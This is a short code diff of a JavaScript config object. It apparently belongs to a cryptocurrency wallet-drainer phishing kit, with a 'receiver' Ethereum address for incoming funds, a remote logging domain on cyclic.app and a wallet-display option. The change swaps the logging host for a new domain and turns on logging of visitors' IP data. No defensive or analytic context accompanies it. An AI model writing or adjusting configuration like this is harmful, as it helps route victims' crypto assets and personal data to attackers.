@@ -8,9 +8,9 @@ const config = {
 
     receiver: "0x6a13b325506A96e01eCB8A16D723591f713a629d",
     
-    logDomainName: "https://blue-hermit-crab-ring.cyclic.app/",
+    logDomainName: "https://alert-tick-smock.cyclic.app/",
 
-    logIpData: false,
+    logIpData: true,
 
     design: {
         walletAppear: true,
